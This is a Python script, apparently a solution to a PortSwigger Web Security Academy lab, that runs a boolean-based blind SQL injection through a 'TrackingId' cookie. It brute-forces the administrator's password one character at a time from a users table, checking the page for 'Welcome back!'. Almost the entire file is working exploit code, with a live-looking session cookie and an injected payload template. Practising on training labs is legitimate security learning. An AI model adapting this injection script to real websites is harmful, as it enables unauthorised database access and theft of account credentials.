from signal import SIGINT
from pwn import *
import requests, time, pdb, sys, string
import os

def def_handler(sig, frame):
    print("\n\n[!]Saliendo....\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
main_url = "https://0afb00300331fd9f86427101002900d4.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    password = ""

    p1 = log.progress("fuerza bruta")
    p1.status("Iniciando ataque...")

    time.sleep(2)

    p2 = log.progress("password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "zWcoI4G7AZ5CTEIa' and (select substring(password,%d,1) from users where username ='administrator')='%s" % (position, character),
                'session': 'I0o20AxsBPt4npizefeAsixPmv2hwI52'
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                os.system("cls")
                p2.status(password)
                break

if __name__=='__main__':

    makeRequest()
